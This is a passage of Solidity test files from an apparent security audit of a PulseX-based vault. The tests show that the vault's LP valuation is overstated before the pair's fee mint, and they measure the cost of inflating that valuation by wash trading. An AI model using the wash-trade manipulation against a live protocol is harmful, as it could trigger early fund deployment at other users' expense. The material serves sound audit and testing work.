        for (uint256 i; i < 100; i++) {
            uint256 amt = i % 2 == 0 ? 30_000e18 : 70_000e18;
            _swap(r, i % 3 != 0, amt);
            _swap(f, i % 3 != 0, amt);
        }
        _same(r, f, "4 after 100 uneven swaps");

        // Phase 5: an off-ratio add: liquidity is the min of the two sides.
        liqR = _mint(r, third, 20_000e18, 25_000e18);
        liqF = _mint(f, third, 20_000e18, 25_000e18);
        assertEq(liqR, liqF, "phase 5 liquidity");
        _same(r, f, "5 off-ratio add (fee mint)");

        // Phase 6: the protocol burns half of its LP (burn runs _mintFee first).
        uint256 half = IPairD(r.pair).balanceOf(lp) / 2;
        (uint256 r0, uint256 r1) = _burn(r, lp, half);
        (uint256 f0, uint256 f1) = _burn(f, lp, half);
        assertEq(r0, f0, "phase 6 amount0");
        assertEq(r1, f1, "phase 6 amount1");
        _same(r, f, "6 half burn (fee mint)");

        // Phase 7: more trading, then the protocol exits fully.
        for (uint256 i; i < 50; i++) {
            _swap(r, i % 2 == 0, 40_000e18);
            _swap(f, i % 2 == 0, 40_000e18);
        }
        uint256 rest = IPairD(r.pair).balanceOf(lp);
        (r0, r1) = _burn(r, lp, rest);
        (f0, f1) = _burn(f, lp, rest);
        assertEq(r0, f0, "phase 7 amount0");
        assertEq(r1, f1, "phase 7 amount1");
        _same(r, f, "7 full exit (fee mint)");

        console2.log("fork block", FORK_BLOCK);
        console2.log("feeTo LP on the real V1 pair  ", IPairD(r.pair).balanceOf(feeTo));
        console2.log("feeTo LP on the faithful pair ", IPairD(f.pair).balanceOf(feeTo));
        console2.log("kLast real    ", IPairD(r.pair).kLast());
        console2.log("kLast faithful", IPairD(f.pair).kLast());
    }

    // ---- helpers ----

    function _newReal() internal returns (Side memory s) {
        s.a = new TokenD();
        s.b = new TokenD();
        s.pair = IFactoryD(V1_FACTORY).createPair(address(s.a), address(s.b));
        s.real = true;
    }

    function _newFaithful() internal returns (Side memory s) {
        s.a = new TokenD();
        s.b = new TokenD();
        PulseXV1FaithfulPair p = new PulseXV1FaithfulPair();
        (address t0, address t1) = address(s.a) < address(s.b) ? (address(s.a), address(s.b)) : (address(s.b), address(s.a));
        p.initialize(t0, t1);
        p.enableFeeOn(feeTo);
        s.pair = address(p);
    }

    function _mint(Side memory s, address to, uint256 xa, uint256 xb) internal returns (uint256 liq) {
        s.a.mint(s.pair, xa);
        s.b.mint(s.pair, xb);
        liq = s.real ? IPairD(s.pair).mint(to, to) : PulseXV1FaithfulPair(s.pair).mint(to);
    }

    function _burn(Side memory s, address from, uint256 lpAmount) internal returns (uint256 o0, uint256 o1) {
        vm.prank(from);
        IPairD(s.pair).transfer(s.pair, lpAmount);
        (o0, o1) = s.real ? IPairD(s.pair).burn(from, from) : PulseXV1FaithfulPair(s.pair).burn(from);
    }

    function _swap(Side memory s, bool aIn, uint256 amountIn) internal {
        address tokenIn = aIn ? address(s.a) : address(s.b);
        (uint112 r0, uint112 r1,) = IPairD(s.pair).getReserves();
        bool zeroForOne = tokenIn == IPairD(s.pair).token0();
        (uint256 rIn, uint256 rOut) = zeroForOne ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 out = (amountIn * 9971 * rOut) / (rIn * 10_000 + amountIn * 9971);
        TokenD(tokenIn).mint(s.pair, amountIn);
        IPairD(s.pair).swap(zeroForOne ? 0 : out, zeroForOne ? out : 0, trader, "");
    }

    function _reserveOf(Side memory s, bool forA) internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = IPairD(s.pair).getReserves();
        bool aIsToken0 = address(s.a) == IPairD(s.pair).token0();
        return forA == aIsToken0 ? uint256(r0) : uint256(r1);
    }

    function _same(Side memory r, Side memory f, string memory phase) internal view {
        assertEq(IPairD(r.pair).totalSupply(), IPairD(f.pair).totalSupply(), string.concat(phase, ": totalSupply"));
        assertEq(IPairD(r.pair).balanceOf(lp), IPairD(f.pair).balanceOf(lp), string.concat(phase, ": protocol LP"));
        assertEq(IPairD(r.pair).balanceOf(third), IPairD(f.pair).balanceOf(third), string.concat(phase, ": third-party LP"));
        assertEq(IPairD(r.pair).balanceOf(feeTo), IPairD(f.pair).balanceOf(feeTo), string.concat(phase, ": feeTo LP"));
        assertEq(_reserveOf(r, true), _reserveOf(f, true), string.concat(phase, ": reserve A"));
        assertEq(_reserveOf(r, false), _reserveOf(f, false), string.concat(phase, ": reserve B"));
        assertEq(IPairD(r.pair).kLast(), IPairD(f.pair).kLast(), string.concat(phase, ": kLast"));
        console2.log(phase);
        console2.log("  totalSupply", IPairD(r.pair).totalSupply());
        console2.log("  feeTo LP   ", IPairD(r.pair).balanceOf(feeTo));
        console2.log("  protocol LP", IPairD(r.pair).balanceOf(lp));
    }
}
```

`test/audit/issues/PolUsdPreMintVaultV1.t.sol`: real vault: rail opens inside the window, test_32 through the next add, the team's sim at three volumes, time to PRVX, wash-trade cost

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {MockUniswapV2Pair} from "../../mocks/MockUniswapV2Pair.sol";
import {LowVolumeLadderSim} from "../../simulation/LowVolumeLadder.t.sol";
import {PulseXV1FaithfulPair} from "./V1FaithfulPair.sol";

/// These tests replace the earlier EMULATION of the V1 fee mint (deal() of LP to feeTo) with a pair that
/// IS the V1 pair logic: `PulseXV1FaithfulPair`, proven bit-identical to the real PulseX V1 pair by
/// PulseXV1Differential.fork.t.sol on a pinned fork. It is swapped in with vm.etch over the pairs the team's
/// own fixture creates (same storage layout), so the real VaultController, ExpansionModule, LiquidityDeployer,
/// IPX token and the team's own router and sim run unchanged on top of a pair whose mint() and burn() run the
/// V1 `_mintFee()` themselves. Nothing is emulated any more: the post-mint figures come from a real mint().

abstract contract V1PairSwap {
    function _faithfulizePair(address pair, address feeTo_) internal {
        _etch(pair, type(PulseXV1FaithfulPair).runtimeCode);
        PulseXV1FaithfulPair(pair).enableFeeOn(feeTo_);
    }

    function _etch(address who, bytes memory code) internal virtual;
}

contract Issue_PreMintThresholdV1 is InflowFixture, V1PairSwap {
    address internal feeTo = makeAddr("pulsexFeeTo");
    address internal exemptTrader = makeAddr("exemptTrader");
    address internal taxedTrader = makeAddr("taxedTrader");
    address internal thirdLp = makeAddr("thirdLp");

    uint256 internal constant STEP = InflowConstants.PRVX_POL_B_USD; // $50K
    uint256 internal constant TRIP_WPLS = 694e18; // the team sim's per-trip size ($2,083 / 3), $1 peg
    uint256 internal constant TRIPS_PER_DAY = 144; // the team sim: 48 cycles x 3 round trips

    function _etch(address who, bytes memory code) internal override {
        vm.etch(who, code);
    }

    function setUp() public override {
        super.setUp();
        _faithfulizePair(ipxWplsPair, feeTo);
        _faithfulizePair(ipxUsdcPair, feeTo);
    }

    // ---- scaffolding ----

    function _build() internal {
        _buildWith(200_000e6, 50_000e6);
    }

    function _buildWith(uint256 seedBucket, uint256 vaultTopUp) internal {
        _seedRailPair(prvx, 500_000_000e18, 5_000_000e18);
        _seedRailPair(plsx, 500_000_000e18, 5_000_000e18);
        _seedRailPair(inc, 500_000_000e18, 5_000_000e18);
        _seedRailPair(pHex, 500_000_000e8, 5_000_000e18);
        _prepareLockedPolB(60_000e6);
        if (seedBucket > 0) _fundSeedBucket(seedBucket);
        if (vaultTopUp > 0) _topUpVault(0, vaultTopUp);
        vm.prank(owner);
        ipx.setFeeExempt(exemptTrader, true);
        _resyncBase();
    }

    function _resyncBase() internal {
        PulseXV1FaithfulPair(ipxWplsPair).resyncKLast();
        PulseXV1FaithfulPair(ipxUsdcPair).resyncKLast();
    }

    function _refresh() internal {
        vm.warp(block.timestamp + 2 hours + 1);
        twapOracle.update(wplsUsdcPair);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        _updateRoutePairTwaps();
    }

    /// Scale both IPX base pairs so B reads `target`; the price does not move. The reserves are placed by hand,
    /// so the fee window is restarted afterwards (kLast = the placed reserves): this is setup, not trading.
    function _scaleBaseTo(uint256 target) internal {
        uint256 now_ = vault.getB();
        address[2] memory pairs = [ipxWplsPair, ipxUsdcPair];
        for (uint256 i; i < 2; i++) {
            address t0 = MockUniswapV2Pair(pairs[i]).token0();
            address t1 = MockUniswapV2Pair(pairs[i]).token1();
            deal(t0, pairs[i], (IERC20(t0).balanceOf(pairs[i]) * target) / now_);
            deal(t1, pairs[i], (IERC20(t1).balanceOf(pairs[i]) * target) / now_);
            MockUniswapV2Pair(pairs[i]).sync();
        }
        _refresh();
        _resyncBase();
    }

    /// Round trips by a fee-exempt trader: only the pair's 0.29% fee applies (no IPX tax, so no vault cycle runs).
    function _washExempt(uint256 trips) internal {
        for (uint256 i; i < trips; i++) {
            _buyIpxWithWpls(exemptTrader, TRIP_WPLS);
            _sellIpxForWpls(exemptTrader, ipx.balanceOf(exemptTrader));
        }
    }

    /// A third party adds 0.01% of each side to a pair and calls mint(): the pair's own V1 `_mintFee()` runs.
    function _thirdPartyMint(address pair) internal {
        (uint112 r0, uint112 r1,) = MockUniswapV2Pair(pair).getReserves();
        address t0 = MockUniswapV2Pair(pair).token0();
        address t1 = MockUniswapV2Pair(pair).token1();
        deal(t0, pair, IERC20(t0).balanceOf(pair) + uint256(r0) / 10_000);
        deal(t1, pair, IERC20(t1).balanceOf(pair) + uint256(r1) / 10_000);
        PulseXV1FaithfulPair(pair).mint(thirdLp);
    }

    function _thirdPartyMintBoth() internal {
        _thirdPartyMint(ipxWplsPair);
        _thirdPartyMint(ipxUsdcPair);
    }

    function _bPreAndPost() internal returns (uint256 bPre, uint256 bPost) {
        bPre = vault.getB();
        uint256 snap = vm.snapshotState();
        _thirdPartyMintBoth();
        bPost = vault.getB();
        vm.revertToState(snap);
    }

    // ---- C3: a rail opens inside the window and not after a REAL V1 fee mint ----

    function test_v1_railOpensInsideTheWindowOnly() public {
        _build();
        console2.log("rail step (PRVX), USD", STEP / 1e6);
        console2.log("PRVX seed, USD", InflowConstants.railSeedUsd(0) / 1e6);

        // Pass 1: how much does one day of the team's volume overstate B on a pool sized for B = step?
        _scaleBaseTo(STEP);
        uint256 snap = vm.snapshotState();
        _washExempt(TRIPS_PER_DAY);
        (uint256 bPre1, uint256 bPost1) = _bPreAndPost();
        uint256 overBps = ((bPre1 - bPost1) * 10_000) / bPost1;
        console2.log("one day of volume: B as read (USD)    ", bPre1 / 1e6);
        console2.log("one day of volume: B after V1 mint    ", bPost1 / 1e6);
        console2.log("one day of volume: overstatement (bps)", overBps);
        vm.revertToState(snap);

        // Pass 2: put the true B half the overstatement below the step (a placed boundary case).
        uint256 bTrue = (STEP * (10_000 - overBps / 2)) / 10_000;
        _scaleBaseTo(bTrue);
        console2.log("true B placed at (USD)", vault.getB() / 1e6);
        _washExempt(TRIPS_PER_DAY);
        (uint256 bPre, uint256 bPost) = _bPreAndPost();
        console2.log("window:   B as read (USD)", bPre / 1e6);
        console2.log("post-mint B (USD)        ", bPost / 1e6);
        assertGe(bPre, STEP, "window B is not over the step");
        assertLt(bPost, STEP, "post-mint B is not under the step");

        // Branch A: the cycle reads B inside the window.
        uint256 snapA = vm.snapshotState();
        uint256 stableBeforeA = usdc.balanceOf(address(vault));
        uint256 spentA = _checkExpansionAsVault();
        console2.log("A (window): stage after checkExpansion", expansion.activeStage());
        console2.log("A (window): stable withdrawn for the seed (USD)", spentA / 1e6);
        console2.log("A (window): vault stable change (USD)", (stableBeforeA - usdc.balanceOf(address(vault))) / 1e6);
        uint256 stageA = expansion.activeStage();
        vm.revertToState(snapA);

        // Branch B: the same state after a real third-party mint() that runs the V1 _mintFee().
        _thirdPartyMintBoth();
        uint256 spentB = _checkExpansionAsVault();
        console2.log("B (post-mint): stage after checkExpansion", expansion.activeStage());
        console2.log("B (post-mint): stable withdrawn (USD)", spentB / 1e6);

        console2.log("early by (USD of B)", (STEP - bPost) / 1e6);
        console2.log("early by (bps of the step)", ((STEP - bPost) * 10_000) / STEP);
        assertEq(stageA, 1, "window: PRVX did not open");
        assertGt(spentA, 0, "window: no seed spent");
        assertEq(expansion.activeStage(), 0, "post-mint: PRVX opened");
        assertEq(spentB, 0, "post-mint: seed spent");
    }

    /// Same boundary state, but the cycle is the production entry point `poke()`.
    function test_v1_pokeOpensRailInsideTheWindowOnly() public {
        _build();
        _scaleBaseTo(STEP);
        uint256 snap = vm.snapshotState();
        _washExempt(TRIPS_PER_DAY);
        (uint256 p1, uint256 q1) = _bPreAndPost();
        uint256 overBps = ((p1 - q1) * 10_000) / q1;
        vm.revertToState(snap);
        _scaleBaseTo((STEP * (10_000 - overBps / 2)) / 10_000);
        _washExempt(TRIPS_PER_DAY);
        (uint256 bPre, uint256 bPost) = _bPreAndPost();
        assertGe(bPre, STEP);
        assertLt(bPost, STEP);

        vm.warp(block.timestamp + InflowConstants.COOLDOWN_PERIOD + 1);
        uint256 snapA = vm.snapshotState();
        uint256 stableA = usdc.balanceOf(address(vault));
        vm.prank(owner);
        vault.poke();
        console2.log("poke in the window: stage", expansion.activeStage());
        console2.log("poke in the window: vault stable change (USD)", (stableA - usdc.balanceOf(address(vault))) / 1e6);
        uint256 stageA = expansion.activeStage();
        vm.revertToState(snapA);

        _thirdPartyMintBoth();
        vm.prank(owner);
        vault.poke();
        console2.log("poke after the V1 fee mint: stage", expansion.activeStage());
        assertEq(stageA, 1, "poke in the window did not open PRVX");
        assertEq(expansion.activeStage(), 0, "poke after the fee mint opened PRVX");
    }

    /// Band below a step in which B reads over the step, by time since the last liquidity add.
    function test_v1_bandWidthByWindow() public {
        vm.pauseGasMetering();
        _build();
        _scaleBaseTo(STEP);
        uint256 done;
        uint256[5] memory marks = [uint256(3), 144, 576, 1008, 1440]; // 1 cycle, 1, 4, 7, 10 days
        for (uint256 m; m < marks.length; m++) {
            _washExempt(marks[m] - done);
            done = marks[m];
            (uint256 bPre, uint256 bPost) = _bPreAndPost();
            console2.log("round trips since last liquidity add", done);
            console2.log("  band below the step (bps of B)", ((bPre - bPost) * 10_000) / bPost);
            console2.log("  band (USD of B)", (bPre - bPost) / 1e6);
        }
    }

    // ---- C6: the client's test_32 idea, carried through the next liquidity add ----

    /// test_32_polUsd_risesOnLpFeeAccrual stops after the accrual. This does the accrual with real swaps (real
    /// 0.29% fees), asserts the same thing (polUsd rises), and then does the next liquidity add on a pair that
    /// has the V1 fee mint, and asserts polUsd falls back. Same setup as theirs: _prepareLockedPolB(150_000e6).
    function test_v1_polUsd_risesOnAccrual_thenFallsBackAtTheNextAdd() public {
        vm.pauseGasMetering();
        _prepareLockedPolB(150_000e6);
        vm.prank(owner);
        ipx.setFeeExempt(exemptTrader, true); // only the pair's 0.29% fee applies, no vault cycle runs
        _resyncBase();

        uint256 polBefore = vault.polUsd(ipxWplsPair);
        uint256 tsBefore = IERC20(ipxWplsPair).totalSupply();

        _washExempt(TRIPS_PER_DAY * 10); // ten days of the team sim's volume, real swaps
        uint256 polMid = vault.polUsd(ipxWplsPair);
        assertEq(IERC20(ipxWplsPair).totalSupply(), tsBefore, "swaps must not mint LP");
        assertGt(polMid, polBefore, "accrued LP fees did not increase POL (the client's own assertion)");

        _thirdPartyMint(ipxWplsPair); // the next liquidity add: the pair's own V1 _mintFee() runs
        uint256 polAfter = vault.polUsd(ipxWplsPair);

        console2.log("polUsd before the accrual (USD, 6 dec)", polBefore);
        console2.log("polUsd after 10 days of swaps         ", polMid);
        console2.log("polUsd after the next liquidity add   ", polAfter);
        console2.log("rise before the add (bps)", ((polMid - polBefore) * 10_000) / polBefore);
        console2.log("change after the add vs before the accrual (bps, signed as 10000+)", (polAfter * 10_000) / polBefore);
        assertLt(polAfter, polMid, "polUsd did not fall back at the next liquidity add");
        assertApproxEqRel(polAfter, polBefore, 1e15, "the accrued fees were not (almost entirely) minted away");
    }

    // ---- C7: what an outsider pays to overstate B by wash trading ----

    function test_v1_costToInflateB() public {
        _buildWith(0, 0);
        _scaleBaseTo((STEP * 9_900) / 10_000);

        _buyIpxWithWpls(taxedTrader, 10e18);
        _sellIpxForWpls(taxedTrader, ipx.balanceOf(taxedTrader)); // consumes the cooldown, runs a cycle
        _resyncBase();
        uint256 bBase = vault.getB();

        uint256 wplsBefore = wpls.balanceOf(taxedTrader);
        uint256 vaultIpxBefore = ipx.balanceOf(address(vault));
        uint256 notional;
        for (uint256 i; i < 40; i++) {
            _buyIpxWithWpls(taxedTrader, TRIP_WPLS);
            notional += 2 * TRIP_WPLS;
            _sellIpxForWpls(taxedTrader, ipx.balanceOf(taxedTrader));
        }
        uint256 spent = 40 * TRIP_WPLS;
        uint256 got = wpls.balanceOf(taxedTrader) - wplsBefore;
        uint256 loss = spent > got ? spent - got : 0;

        (uint256 bPre, uint256 bPost) = _bPreAndPost();
        uint256 overstate = bPre > bPost ? bPre - bPost : 0;
        console2.log("stage still", expansion.activeStage());
        console2.log("40 round trips, swap notional (USD)       ", notional / 1e18);
        console2.log("attacker paid in total (USD)             ", loss / 1e18);
        console2.log("IPX tax collected by the vault (IPX, 1e18)", (ipx.balanceOf(address(vault)) - vaultIpxBefore) / 1e18);
        console2.log("B before (USD, 6 dec)", bBase);
        console2.log("B overstatement created (USD, 6 dec)", overstate);
        console2.log("attacker cost / overstatement (x100)", overstate == 0 ? 0 : (loss / 1e12 * 100) / overstate);
    }
}

/// The team's own ladder sim, run twice from the same state with the same trades: (1) on the team's pairs as
/// they are (no protocol fee), (2) with the two IPX base pairs replaced by the V1-faithful pair, so every liquidity
/// add the vault makes runs the V1 `_mintFee()`. Reports the ACTUAL swap volume the sim puts through the IPX base
/// pairs (counted inside the pair), B as read, B after a real third-party mint, and the baseline B.
contract Issue_PreMintSimV1 is LowVolumeLadderSim, V1PairSwap {
    address internal feeTo = makeAddr("pulsexFeeTo");
    address internal thirdLp = makeAddr("thirdLp");

    function _etch(address who, bytes memory code) internal override {
        vm.etch(who, code);
    }

    function _bAfterThirdPartyMint() internal returns (uint256 b) {
        uint256 snap = vm.snapshotState();
        _mintThird(ipxWplsPair);
        _mintThird(ipxUsdcPair);
        b = vault.getB();
        vm.revertToState(snap);
    }

    function _mintThird(address pair) internal {
        (uint112 r0, uint112 r1,) = MockUniswapV2Pair(pair).getReserves();
        address t0 = MockUniswapV2Pair(pair).token0();
        address t1 = MockUniswapV2Pair(pair).token1();
        deal(t0, pair, IERC20(t0).balanceOf(pair) + uint256(r0) / 10_000);
        deal(t1, pair, IERC20(t1).balanceOf(pair) + uint256(r1) / 10_000);
        PulseXV1FaithfulPair(pair).mint(thirdLp);
    }

    /// Cumulative swap notional at a pair, in USD, from its own counters: every swap has the quote token (WPLS
    /// at the $1 peg, or USDC) on exactly one side, so notional = quote in + quote out.
    function _quoteVolumeUsd(address pair, address quote, uint8 dec) internal view returns (uint256) {
        PulseXV1FaithfulPair p = PulseXV1FaithfulPair(pair);
        bool quoteIs0 = p.token0() == quote;
        uint256 q = quoteIs0 ? p.cumIn0() + p.cumOut0() : p.cumIn1() + p.cumOut1();
        return q / (10 ** dec);
    }

    function _scenario(uint256 tradeUsd, string memory label) internal {
        pinPrice = true;
        vm.pauseGasMetering();
        uint256 snap0 = vm.snapshotState();
        uint256 launchB = vault.getB();
        uint256[3] memory marks = [uint256(48), 240, 480]; // days 1, 5, 10
        uint256[3] memory baseB;
        uint256[3] memory bRead;
        uint256[3] memory bPost;

        // Run 1: the team's pairs as they are.
        uint256 m;
        for (uint256 c = 1; c <= 480; c++) {
            this.simCycle(tradeUsd, c);
            if (c == marks[m]) {
                baseB[m] = vault.getB();
                if (m < 2) m++;
            }
        }
        uint256 baseDeployments = tally.deployments;
        uint256 baseStage = vault.activeStage();
        vm.revertToState(snap0);

        // Run 2: the two IPX base pairs are V1 pairs.
        _faithfulizePair(ipxWplsPair, feeTo);
        _faithfulizePair(ipxUsdcPair, feeTo);
        m = 0;
        for (uint256 c = 1; c <= 480; c++) {
            this.simCycle(tradeUsd, c);
            if (c == marks[m]) {
                bRead[m] = vault.getB();
                bPost[m] = _bAfterThirdPartyMint();
                if (m < 2) m++;
            }
        }
        uint256 volWpls = _quoteVolumeUsd(ipxWplsPair, address(wpls), 18);
        uint256 volUsdc = _quoteVolumeUsd(ipxUsdcPair, address(usdc), 6);
        uint256 totalVol = volWpls + volUsdc;
        uint256 traderVol = 480 * 2 * tradeUsd / 1e6; // alice: a buy and a sell of the same size each trip

        console2.log("=== V1 pair inside the team's ladder sim:", label);
        console2.log("launch B (USD)", launchB / 1e6);
        console2.log("stage after 480 cycles (baseline / V1 run)", baseStage, vault.activeStage());
        console2.log("deployments in 480 cycles (baseline / V1 run)", baseDeployments, tally.deployments);
        console2.log("label per day (USD): trade size x 48 cycles", (tradeUsd * 48) / 1e6);
        console2.log("trader swap volume per day (USD): buy + sell", traderVol / 10);
        console2.log("ACTUAL swap volume per day at the IPX base pairs (USD)", totalVol / 10);
        console2.log("  of which IPX/WPLS pair", volWpls / 10);
        console2.log("  of which IPX/USDC pair", volUsdc / 10);
        for (uint256 i; i < 3; i++) {
            console2.log("day", marks[i] / 48);
            console2.log("  baseline B (team's pairs, no fee mint)", baseB[i] / 1e6);
            console2.log("  V1 run: B as read                     ", bRead[i] / 1e6);
            console2.log("  V1 run: B after a real fee mint       ", bPost[i] / 1e6);
            console2.log("  overstatement (bps of B after mint)   ", bRead[i] > bPost[i] ? ((bRead[i] - bPost[i]) * 10_000) / bPost[i] : 0);
        }
        uint256 growthRead = bRead[2] > launchB ? bRead[2] - launchB : 0;
        uint256 growthKept = bPost[2] > launchB ? bPost[2] - launchB : 0;
        console2.log("B growth as read over 10 days (USD)", growthRead / 1e6);
        console2.log("B growth that survives the fee mint (USD)", growthKept / 1e6);
        console2.log("share of the as-read growth taken back (bps)", growthRead == 0 ? 0 : ((growthRead - growthKept) * 10_000) / growthRead);
        uint256 growthBase = baseB[2] > launchB ? baseB[2] - launchB : 0;
        console2.log("baseline growth (no fee mint) over 10 days (USD)", growthBase / 1e6);
        console2.log("share of baseline growth missing on V1 (bps)", growthBase == 0 ? 0 : growthBase > growthKept ? ((growthBase - growthKept) * 10_000) / growthBase : 0);
    }

    /// Runs the sim until PRVX opens (stage >= 1) or `maxCycles`. Returns the cycle and B as read at that moment.
    function _runUntilPrvx(uint256 tradeUsd, uint256 maxCycles) internal returns (uint256 openedAt, uint256 bRead_, uint256 bTrue) {
        for (uint256 c = 1; c <= maxCycles; c++) {
            this.simCycle(tradeUsd, c);
            if (vault.activeStage() >= 1) {
                return (c, vault.getB(), _bAfterThirdPartyMint());
            }
        }
        return (0, vault.getB(), _bAfterThirdPartyMint());
    }

    /// Does PRVX open later on V1 than on the team's pairs, and is it opened while the true B (after a real fee
    /// mint) is still under the $50K step? Same trades, same sim, only the pair differs.
    function _timeToPrvx(uint256 tradeUsd, string memory label, uint256 maxCycles) internal {
        pinPrice = true;
        vm.pauseGasMetering();
        uint256 snap0 = vm.snapshotState();
        (uint256 baseOpen, uint256 baseRead,) = _runUntilPrvx(tradeUsd, maxCycles);
        vm.revertToState(snap0);

        _faithfulizePair(ipxWplsPair, feeTo);
        _faithfulizePair(ipxUsdcPair, feeTo);
        (uint256 v1Open, uint256 v1Read, uint256 v1True) = _runUntilPrvx(tradeUsd, maxCycles);

        console2.log("=== time to open PRVX:", label);
        console2.log("max cycles allowed", maxCycles);
        console2.log("baseline (team's pairs): opened at cycle (0 = not opened)", baseOpen);
        console2.log("baseline: day", baseOpen / 48);
        console2.log("baseline: B as read at that moment (USD)", baseRead / 1e6);
        console2.log("V1 run: opened at cycle (0 = not opened)", v1Open);
        console2.log("V1 run: day", v1Open / 48);
        console2.log("V1 run: B as read at that moment (USD)", v1Read / 1e6);
        console2.log("V1 run: true B after a real fee mint at that moment (USD)", v1True / 1e6);
        console2.log("PRVX step (USD)", InflowConstants.PRVX_POL_B_USD / 1e6);
    }

    function test_v1sim_timeToPrvx_30K() public {
        _timeToPrvx(625e6, "$30K/day label", 6_000);
    }

    function test_v1sim_timeToPrvx_10K() public {
        _timeToPrvx(208e6, "$10K/day label", 8_000);
    }

    function test_v1sim_10K() public {
        _scenario(208e6, "$10K/day label");
    }

    function test_v1sim_30K() public {
        _scenario(625e6, "$30K/day label");
    }

    function test_v1sim_100K() public {
        _scenario(2_083e6, "$100K/day label");
    }
}
```

`test/audit/issues/PolUsdPreMintWindow.fork.t.sol`: value overstated before the fee mint on real V1 and V2 pairs

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IFactory {
    function createPair(address a, address b) external returns (address);
    function feeTo() external view returns (address);
}

interface IPair {
    function mint(address to, address senderOrigin) external returns (uint256); // PulseX signature
    function swap(uint256 out0, uint256 out1, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Measures how much a polUsd-style valuation of locked LP is overstated in the window before
/// the pair's _mintFee() fires, on the real PulseX V1 and V2 pair contracts.
///
/// polUsd() for a base pair is lpBal * 2 * sqrt(v0 * v1) / totalSupply with the TWAP prices
/// pinned. With the prices held fixed the only moving part is sqrt(r0 * r1) / totalSupply, so
/// this test measures that per-LP-token quantity immediately before and immediately after a
/// third party's liquidity add triggers _mintFee().
///
/// Run (public RPC is enough, no key):
///   PULSECHAIN_RPC_URL=https://rpc.pulsechain.com \
///   forge test --match-path test/audit/issues/PolUsdPreMintWindow.fork.t.sol -vv
contract Issue_PolUsdPreMintWindow is Test {
    address constant V1_FACTORY = 0x1715a3E4A142d8b698131108995174F37aEBA10D;
    address constant V2_FACTORY = 0x29eA7545DEf87022BAdc76323F373EA1e707C523;

    uint256 constant DEPOSIT = 1_000_000e18; // each side, whole pool
    uint256 constant TRADE = 50_000e18;

    address protocol = makeAddr("protocol");
    address otherLp = makeAddr("otherLp");
    address trader = makeAddr("trader");
    address thirdParty = makeAddr("thirdParty");

    struct Result {
        uint256 poolGrowthPpm; // growth of sqrt(k) since the last mint, ppm
        uint256 overvaluePpm; // pre-mint per-LP value over post-mint per-LP value, ppm
        uint256 protocolLpValuePre; // protocol LP value in token units (2*sqrt(k)*lp/ts), pre-mint
        uint256 protocolLpValuePost; // same, post-mint
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("PULSECHAIN_RPC_URL"));
    }

    function test_preMintOvervaluation() public {
        uint256[3] memory tradeCounts = [uint256(10), 100, 400];
        uint256[2] memory sharesBps = [uint256(10_000), 2_500];

        for (uint256 s; s < sharesBps.length; s++) {
            for (uint256 t; t < tradeCounts.length; t++) {
                Result memory r1 = _measure(V1_FACTORY, tradeCounts[t], sharesBps[s]);
                Result memory r2 = _measure(V2_FACTORY, tradeCounts[t], sharesBps[s]);
                console2.log("---");
                console2.log("protocol share (bps)", sharesBps[s]);
                console2.log("trades since last mint", tradeCounts[t]);
                console2.log("pool sqrt(k) growth (ppm)", r1.poolGrowthPpm);
                console2.log("V1 overvaluation (ppm) ", r1.overvaluePpm);
                console2.log("V2 overvaluation (ppm) ", r2.overvaluePpm);
                console2.log("V1 protocol LP value pre (tokens)  ", r1.protocolLpValuePre / 1e18);
                console2.log("V1 protocol LP value post (tokens) ", r1.protocolLpValuePost / 1e18);

                // V1 mints the whole growth to feeTo, so the window overstates by about the growth.
                assertApproxEqRel(r1.overvaluePpm, r1.poolGrowthPpm, 2e16, "V1: overvaluation != growth");
                // V2 leaves 22/29 of the growth with LPs, so the dilution is 7/29 of it.
                assertApproxEqRel(r2.overvaluePpm, (r2.poolGrowthPpm * 7) / 29, 5e16, "V2: overvaluation != 7/29 growth");
            }
        }
    }

    function _measure(address factory, uint256 trades, uint256 shareBps) internal returns (Result memory r) {
        Token a = new Token();
        Token b = new Token();
        IPair pair = IPair(IFactory(factory).createPair(address(a), address(b)));
        assertTrue(IFactory(factory).feeTo() != address(0), "protocol fee is off");

        uint256 mine = (DEPOSIT * shareBps) / 10_000;
        uint256 theirs = DEPOSIT - mine;
        a.mint(address(pair), mine);
        b.mint(address(pair), mine);
        pair.mint(protocol, protocol);
        if (theirs > 0) {
            a.mint(address(pair), theirs);
            b.mint(address(pair), theirs);
            pair.mint(otherLp, otherLp);
        }
        uint256 lp = pair.balanceOf(protocol);

        uint256 perLast = _perLp(pair); // per-LP value right after the last mint
        for (uint256 i; i < trades; i++) {
            _swap(pair, i % 2 == 0 ? address(a) : address(b), TRADE);
        }
        uint256 perPre = _perLp(pair);
        r.protocolLpValuePre = (perPre * lp) / 1e18;
        r.poolGrowthPpm = ((perPre - perLast) * 1e6) / perLast;

        // A third party adds a sliver of liquidity at the current ratio. mint() runs _mintFee() first.
        (uint112 r0, uint112 r1,) = pair.getReserves();
        a.mint(address(pair), uint256(r0) / 1e9);
        b.mint(address(pair), uint256(r1) / 1e9);
        pair.mint(thirdParty, thirdParty);

        uint256 perPost = _perLp(pair);
        r.protocolLpValuePost = (perPost * lp) / 1e18;
        r.overvaluePpm = ((perPre - perPost) * 1e6) / perPost;
    }

    /// 2 * sqrt(r0 * r1) / totalSupply, scaled by 1e18 (prices pinned, so this is polUsd per LP token)
    function _perLp(IPair pair) internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        return (2 * _sqrt(uint256(r0) * uint256(r1)) * 1e18) / pair.totalSupply();
    }

